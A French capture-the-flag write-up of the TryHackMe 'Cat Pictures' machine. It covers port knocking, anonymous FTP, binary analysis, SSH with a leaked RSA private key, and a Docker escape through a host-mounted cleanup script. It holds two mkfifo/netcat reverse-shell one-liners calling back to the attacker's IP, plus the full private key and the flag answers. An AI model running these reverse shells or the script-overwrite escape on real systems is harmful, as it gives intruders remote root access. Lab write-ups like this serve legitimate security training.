# Cat Pictures #

## Task 1 Deploy the machine! ##

**Deploy me!**

CLiquez sur start machine.    

## Task 2 Flags, flags, flags! ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.68.172 catpictures.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A catpictures.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 21:04 CEST
Nmap scan report for catpictures.thm (10.10.68.172)
Host is up (0.063s latency).
Not shown: 65531 closed ports
PORT     STATE    SERVICE    VERSION
21/tcp   filtered ftp
22/tcp   open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
2375/tcp filtered docker
8080/tcp filtered http-proxy
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/12%OT=22%CT=1%CU=30469%PV=Y%DS=2%DC=T%G=Y%TM=6115714
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
OS:1NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   32.09 ms 10.9.0.1
2   51.71 ms catpictures.thm (10.10.68.172)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.65 seconds

```

D'après le scan nmap on voit plusieurs services :
Le service FTP sur le port 21.   
Le service SSH sur le port 22.   
Le service sur un docker sur le port 2375.   
Le service HTTP sur le port 8080.     

![page1](./Task2-01.png)

Quand on va sur le site on tombe sur un forum.  
Dans un message on nous dit de frapper des ports.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ knock catpictures.thm 1111 2222 3333 4444

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A catpictures.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 21:17 CEST
Nmap scan report for catpictures.thm (10.10.68.172)
Host is up (0.034s latency).
Not shown: 65530 closed ports
PORT     STATE    SERVICE      VERSION
21/tcp   filtered ftp
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
2375/tcp filtered docker
4420/tcp open     nvm-express?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|     Please enter password:
|     Invalid password...
|     Connection Closed
|   NULL, RPCCheck: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|_    Please enter password:
8080/tcp open     http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
|_http-title: Cat Pictures - Index page
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4420-TCP:V=7.91%I=7%D=8/12%Time=611575F5%P=x86_64-pc-linux-gnu%r(NU
SF:LL,A0,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\
SF:x20do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20ar
SF:e\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\
SF:nPlease\x20enter\x20password:\n")%r(GenericLines,C6,"INTERNAL\x20SHELL\
SF:x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20a
SF:t\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x
SF:20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passw
SF:ord:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(GetRequest,
SF:C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20
SF:do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x
SF:20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPl
SF:ease\x20enter\x20password:\nInvalid\x20password\.\.\.\nConnection\x20Cl
SF:osed\n")%r(HTTPOptions,C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note
SF::\x20cd\x20commands\x20do\x20not\x20work\x20at\x20the\x20moment,\x20the
SF:\x20developers\x20are\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20n
SF:ot\x20use\x20ctrl-c\nPlease\x20enter\x20password:\nInvalid\x20password\
SF:.\.\.\nConnection\x20Closed\n")%r(RTSPRequest,C6,"INTERNAL\x20SHELL\x20
SF:SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at\x
SF:20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x20t
SF:he\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20password
SF::\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(RPCCheck,A0,"I
SF:NTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x2
SF:0not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x20fix
SF:ing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\
SF:x20enter\x20password:\n")%r(DNSVersionBindReqTCP,C6,"INTERNAL\x20SHELL\
SF:x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20a
SF:t\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x
SF:20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passw
SF:ord:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/12%OT=22%CT=1%CU=39770%PV=Y%DS=2%DC=T%G=Y%TM=6115764
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=101%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
OS:1NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   37.14 ms 10.9.0.1
2   37.74 ms catpictures.thm (10.10.68.172)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 642.37 seconds

```

On voit un nouveau service sur le port 4420.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ftp catpictures.thm
Connected to catpictures.thm.
220 (vsFTPd 3.0.3)
Name (catpictures.thm:tim): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           162 Apr 02 14:32 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (162 bytes).
226 Transfer complete.
162 bytes received in 0.00 secs (43.1542 kB/s)

tim@kali:~/Bureau/tryhackme/write-up$ cat note.txt 
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover

```

On se connecte sur le service FTP sous anonymous.    
On récupère un fichier note.txt   
On lit le fichier.   

Dans la note on un mot de passe : sardinethecat   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc  catpictures.thm 4420
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
sardinethecat
Password accepted
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -u 2>&1|nc 10.9.228.66 1234 >/tmp/f
```

On exécute un reverse shell.  


```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.9.228.66] from (UNKNOWN) [10.10.175.55] 37412
ls
bin
etc
home
lib
lib64
opt
tmp
usr
cd home
ls
catlover
cd catlover
ls -al
total 28
drwxr-xr-x 2 0 0  4096 Apr  3 01:34 .
drwxr-xr-x 3 0 0  4096 Apr  2 20:51 ..
-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
nc  10.9.228.66 4444 < runme
Listening on [0.0.0.0] (family 0, port 443)
```

On trouve un fichier exécutable runme.   
On va le transferer sur notre machine pour l'analyser.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ man nc
tim@kali:~/Bureau/tryhackme/write-up$ nc -l -p 4444 > runme
^C

tim@kali:~/Bureau/tryhackme/write-up$ file runme 
runme: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d5d24f8a79f2afcadac716e2a6f6cdad3f38d9fe, for GNU/Linux 3.2.0, not stripped

tim@kali:~/Bureau/tryhackme/write-up$ radare2 runme 
Warning: run r2 with -e io.cache=true to fix relocations in disassembly
[0x00001240]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00001240]> afl
0x00001240    1 46           entry0
0x00001270    4 41   -> 34   sym.deregister_tm_clones
0x000012a0    4 57   -> 51   sym.register_tm_clones
0x000012e0    5 57   -> 54   sym.__do_global_dtors_aux
0x00001130    1 11           sym..plt.got
0x00001320    1 9            entry.init0
0x0000149e    4 77           sym.__static_initialization_and_destruction_0_int__int_
0x00001210    1 11           sym.imp.std::ios_base::Init::Init__
0x00001180    1 11           sym.imp.__cxa_atexit
0x000014eb    1 25           sym._GLOBAL__sub_I_main
0x00001000    3 27           sym._init
0x00001329    7 373  -> 301  main
0x00001648    1 13           sym._fini
0x00001504    4 64           method.std::char_traits_char_.compare_char_const__char_const__unsigned_long_
0x000015d0    4 101          sym.__libc_csu_init
0x00001544    5 136          method.__gnu_cxx::__enable_if_std::__is_char_char_::__value__bool_::__type_std.operator_char__std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____const__std::__cxx11::basic_string_char__std::char_traits_char___std::allocato
0x00001640    1 5            sym.__libc_csu_fini
0x00001140    1 11           sym.imp.memcmp
0x00001150    1 11           fcn.00001150
0x00001160    1 11           sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::size___const
0x00001170    1 11           sym.imp.system
0x00001190    1 11           sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_
0x000011a0    1 11           sym.imp.std::ostream::operator___std::ostream____std::ostream__
0x000011b0    1 11           fcn.000011b0
0x000011c0    1 11           sym.imp.__stack_chk_fail
0x000011d0    1 11           sym.imp.std::basic_istream_char__std::char_traits_char____std::operator___char__std::char_traits_char___std::allocator_char____std::basic_istream_char__std::char_traits_char_____std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____
0x000011e0    1 11           sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::data___const
0x000011f0    1 11           sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string_char_const__std::allocator_char__const_
0x00001200    1 11           sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string__
0x00001220    1 11           sym.imp._Unwind_Resume
0x00001230    1 11           sym.imp.std::allocator_char_::allocator__
[0x00001240]> pdf @main
            ; DATA XREF from entry0 @ 0x1261
┌ 301: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_61h @ rbp-0x61
│           ; var int64_t var_60h @ rbp-0x60
│           ; var int64_t var_40h @ rbp-0x40
│           ; var int64_t canary @ rbp-0x18
│           ; var int64_t var_8h @ rbp-0x8
│           0x00001329      f30f1efa       endbr64
│           0x0000132d      55             catlover@mov rax, qword fs:[0x28]
│           0x0000133f      488945e8       mov qword [canary], rax
│           0x00001343      31c0           xor eax, eax
│           0x00001345      488d459f       lea rax, [var_61h]
│           0x00001349      4889c7         mov rdi, rax
│           0x0000134c      e8dffeffff     call sym std::allocator<char>::allocator() ; sym.imp.std::allocator_char_::allocator__
│           0x00001351      488d559f       lea rdx, [var_61h]
│           0x00001355      488d45a0       lea rax, [var_60h]
│           0x00001359      488d35a90c00.  lea rsi, str.rebecca        ; 0x2009 ; "rebecca"
│           0x00001360      4889c7         mov rdi, rax
│           0x00001363      e888feffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string_char_const__std::allocator_char__const_
│           0x00001368      488d459f       lea rax, [var_61h]
│           0x0000136c      4889c7         mov rdi, rax

```

On récupère le fichier on l'analyse avec radar2 on voit une variable rebecca.

```bash
./runme	
Please enter yout password: rebecca
Welcome, catlover! SSH key transfer queued! 

ls
id_rsa
runme

cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5
IWnCNvY8gOZdOSWgDODCj8mOssL7SIIgkOuD1OzM0cMBSCCwYlaN9F8zmz6UJX+k
jSmQqh7eqtXuAvOkadRoFlyog2kZ1Gb72zebR75UCBzCKv1zODRx2zLgFyGu0k2u
xCa4zmBdm80X0gKbk5MTgM4/l8U3DFZgSg45v+2uM3aoqbhSNu/nXRNFyR/Wb10H
tzeTEJeqIrjbAwcOZzPhISo6fuUVNH0pLQOf/9B1ojI3/jhJ+zE6MB0m77iE07cr
lT5PuxlcjbItlEF9tjqudycnFRlGAKG6uU8/8wIDAQABAoIBAH1NyDo5p6tEUN8o
aErdRTKkNTWknHf8m27h+pW6TcKOXeu15o3ad8t7cHEUR0h0bkWFrGo8zbhpzcte
D2/Z85xGsWouufPL3fW4ULuEIziGK1utv7SvioMh/hXmyKymActny+NqUoQ2JSBB
QuhqgWJppE5RiO+U5ToqYccBv+1e2bO9P+agWe+3hpjWtiAUHEdorlJK9D+zpw8s
/+9CjpDzjXA45X2ikZ1AhWNLhPBnH3CpIgug8WIxY9fMbmU8BInA8M4LUvQq5A63
zvWWtuh5bTkj622QQc0Eq1bJ0bfUkQRD33sqRVUUBE9r+YvKxHAOrhkZHsvwWhK/
oylx3WECgYEAyFR+lUqnQs9BwrpS/A0SjbTToOPiCICzdjW9XPOxKy/+8Pvn7gLv
00j5NVv6c0zmHJRCG+wELOVSfRYv7z88V+mJ302Bhf6uuPd9Xu96d8Kr3+iMGoqp
tK7/3m4FjoiNCpZbQw9VHcZvkq1ET6qdzU+1I894YLVu258KeCVUqIMCgYEAwvHy
QTo6VdMOdoINzdcCCcrFCDcswYXxQ5SpI4qMpHniizoa3oQRHO5miPlAKNytw5PQ
zSKoIW47AObP2twzVAH7d+PWRzqAGZXW8gsF6Ls48LxSJGzz8V191PjbcGQO7Oro
Em8pQ+qCISxv3A8fKvG5E9xOspD0/3lsM/zGD9ECgYBOTgDAuFKS4dKRnCUt0qpK
68DBJfJHYo9DiJQBTlwVRoh/h+fLeChoTSDkQ5StFwTnbOg+Y83qAqVwsYiBGxWq
Q2YZ/ADB8KA5OrwtrKwRPe3S8uI4ybS2JKVtO1I+uY9v8P+xQcACiHs6OTH3dfiC
tUJXwhQKsUCo5gzAk874owKBgC/xvTjZjztIWwg+WBLFzFSIMAkjOLinrnyGdUqu
aoSRDWxcb/tF08efwkvxsRvbmki9c97fpSYDrDM+kOQsv9rrWeNUf4CpHJQuS9zf
ZSal1Q0v46vdt+kmqynTwnRTx2/xHf5apHV1mWd7PE+M0IeJR5Fg32H/UKH8ROZM
RpHhAoGAehljGmhge+i0EPtcok8zJe+qpcV2SkLRi7kJZ2LaR97QAmCCsH5SndzR
tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt
O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
-----END RSA PRIVATE KEY-----

```

On mettant le mot de passe on a accès a une clef privée.   

On copie la clef dans un fichier de nom id_rsa.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat id_rsa 
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5
IWnCNvY8gOZdOSWgDODCj8mOssL7SIIgkOuD1OzM0cMBSCCwYlaN9F8zmz6UJX+k
jSmQqh7eqtXuAvOkadRoFlyog2kZ1Gb72zebR75UCBzCKv1zODRx2zLgFyGu0k2u
xCa4zmBdm80X0gKbk5MTgM4/l8U3DFZgSg45v+2uM3aoqbhSNu/nXRNFyR/Wb10H
tzeTEJeqIrjbAwcOZzPhISo6fuUVNH0pLQOf/9B1ojI3/jhJ+zE6MB0m77iE07cr
lT5PuxlcjbItlEF9tjqudycnFRlGAKG6uU8/8wIDAQABAoIBAH1NyDo5p6tEUN8o
aErdRTKkNTWknHf8m27h+pW6TcKOXeu15o3ad8t7cHEUR0h0bkWFrGo8zbhpzcte
D2/Z85xGsWouufPL3fW4ULuEIziGK1utv7SvioMh/hXmyKymActny+NqUoQ2JSBB
QuhqgWJppE5RiO+U5ToqYccBv+1e2bO9P+agWe+3hpjWtiAUHEdorlJK9D+zpw8s
/+9CjpDzjXA45X2ikZ1AhWNLhPBnH3CpIgug8WIxY9fMbmU8BInA8M4LUvQq5A63
zvWWtuh5bTkj622QQc0Eq1bJ0bfUkQRD33sqRVUUBE9r+YvKxHAOrhkZHsvwWhK/
oylx3WECgYEAyFR+lUqnQs9BwrpS/A0SjbTToOPiCICzdjW9XPOxKy/+8Pvn7gLv
00j5NVv6c0zmHJRCG+wELOVSfRYv7z88V+mJ302Bhf6uuPd9Xu96d8Kr3+iMGoqp
tK7/3m4FjoiNCpZbQw9VHcZvkq1ET6qdzU+1I894YLVu258KeCVUqIMCgYEAwvHy
QTo6VdMOdoINzdcCCcrFCDcswYXxQ5SpI4qMpHniizoa3oQRHO5miPlAKNytw5PQ
zSKoIW47AObP2twzVAH7d+PWRzqAGZXW8gsF6Ls48LxSJGzz8V191PjbcGQO7Oro
Em8pQ+qCISxv3A8fKvG5E9xOspD0/3lsM/zGD9ECgYBOTgDAuFKS4dKRnCUt0qpK
68DBJfJHYo9DiJQBTlwVRoh/h+fLeChoTSDkQ5StFwTnbOg+Y83qAqVwsYiBGxWq
Q2YZ/ADB8KA5OrwtrKwRPe3S8uI4ybS2JKVtO1I+uY9v8P+xQcACiHs6OTH3dfiC
tUJXwhQKsUCo5gzAk874owKBgC/xvTjZjztIWwg+WBLFzFSIMAkjOLinrnyGdUqu
aoSRDWxcb/tF08efwkvxsRvbmki9c97fpSYDrDM+kOQsv9rrWeNUf4CpHJQuS9zf
ZSal1Q0v46vdt+kmqynTwnRTx2/xHf5apHV1mWd7PE+M0IeJR5Fg32H/UKH8ROZM
RpHhAoGAehljGmhge+i0EPtcok8zJe+qpcV2SkLRi7kJZ2LaR97QAmCCsH5SndzR
tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt
O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
-----END RSA PRIVATE KEY-----

tim@kali:~/Bureau/tryhackme/write-up$ chmod 600 id_rsa 

tim@kali:~/Bureau/tryhackme/write-up$ ssh -i id_rsa catlover@catpictures.thm
The authenticity of host 'catpictures.thm (10.10.57.209)' can't be established.
ECDSA key fingerprint is SHA256:7HBac/JH7EKQik9kL1l9GMjCgLN/69gfXalu5cbPi4U.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'catpictures.thm,10.10.57.209' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Aug 12 14:05:20 PDT 2021

  System load:  0.08               Users logged in:                0
  Usage of /:   37.2% of 19.56GB   IP address for eth0:            10.10.57.209
  Memory usage: 70%                IP address for br-98674f8f20f9: 172.18.0.1
  Swap usage:   0%                 IP address for docker0:         172.17.0.1
  Processes:    110


52 updates can be applied immediately.
25 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Jun  4 14:40:35 2021

root@7546fa2336d6:/# id
uid=0(root) gid=0(root) groups=0(root)
root@7546fa2336d6:/root# ls
flag.txt
root@7546fa2336d6:/root# cat flag.txt
7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9

```

On configure la clef et on se connect.   
On a les droits root et on trouve un fichier flag.txt.   
On le lit.  

La réponse est : 7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9  

```bash
root@7546fa2336d6:/root# grep 'docker\|lxc' /proc/1/cgroup
12:memory:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
11:freezer:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
10:cpuset:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
9:pids:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
8:perf_event:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
7:devices:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
6:blkio:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
5:hugetlb:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
3:cpu,cpuacct:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
2:net_cls,net_prio:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
1:name=systemd:/docker/7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a

```

D'arpès la structure de fichier et le nom de la machine on est dans un docker.   
Il faut que l'on s'évade du conteneur.   

```bash
root@7546fa2336d6:/root# df
Filesystem     1K-blocks    Used Available Use% Mounted on
overlay         20509264 7632228  11812180  40% /
tmpfs              65536       0     65536   0% /dev
tmpfs             245328       0    245328   0% /sys/fs/cgroup
shm                65536       0     65536   0% /dev/shm
/dev/xvda1      20509264 7632228  11812180  40% /opt/clean
tmpfs             245328       0    245328   0% /proc/acpi
tmpfs             245328       0    245328   0% /proc/scsi
tmpfs             245328       0    245328   0% /sys/firmware
```

En regardant les différents partitions on voit \/opt\/clean qui sort de lot.   
Regardons ceci.  

```bash
oot@7546fa2336d6:/root# cd /opt/clean
root@7546fa2336d6:/opt/clean#
root@7546fa2336d6:/opt/clean# cat clean.sh 
#!/bin/bash

rm -rf /tmp/*

```

Dans avons un script dans le clean qui éfface les fichiers temporaires.  
Ce point de montage est sûrement en dehors du conteneur.   

```bash
root@7546fa2336d6:/opt/clean# echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.228.66 4444 >/tmp/f" > /opt/clean/clean.sh
```

On met un reverse shell dans clean.sh  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 4444
listening on [any] 4444 ...
```

On écoute le port 4444 pour établir une connexion avec le reverse shell.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.228.66] from (UNKNOWN) [10.10.57.209] 47220
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
Congrats!!!
Here is your flag:

4a98e43d78bab283938a06f38d2ca3a3c53f0476
```

On bout de quelques minutes on a un shell avec les droits root.   
On lit le flag dans /root/root.txt.   

La réponse est : 4a98e43d78bab283938a06f38d2ca3a3c53f0476    


